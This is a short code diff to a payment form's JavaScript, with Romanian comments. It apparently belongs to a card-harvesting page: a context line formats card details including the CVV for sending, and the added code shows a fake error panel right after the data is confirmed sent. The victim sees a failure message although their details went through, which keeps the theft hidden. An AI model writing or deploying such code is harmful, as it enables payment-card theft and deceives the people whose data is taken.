@@ -28,6 +28,7 @@ CVV: ${cvv}
             if (data.ok) {
                 //alert("Datele au fost trimise cu succes!");
                 closePaymentForm(); // Close the payment form after submission
+                showErrorPanel(); 
             } else {
                 //alert("A apărut o eroare la trimiterea datelor.");
             }
@@ -64,6 +65,15 @@ function openPaymentForm() {
 function closePaymentForm() {
     document.getElementById('overlay').style.display = 'none'; // Hide overlay
     document.getElementById('paymentFormContainer').style.display = 'none'; // Hide payment form
+  // Show error panel instead of hiding payment form
+}
+
+function showErrorPanel() {
+    document.getElementById('errorPanel').style.display = 'flex'; // Show error panel
+}
+
+function closeErrorPanel() {
+    document.getElementById('errorPanel').style.display = 'none'; // Hide error panel
 }
 
 // Update the button in the button-container to open the payment form
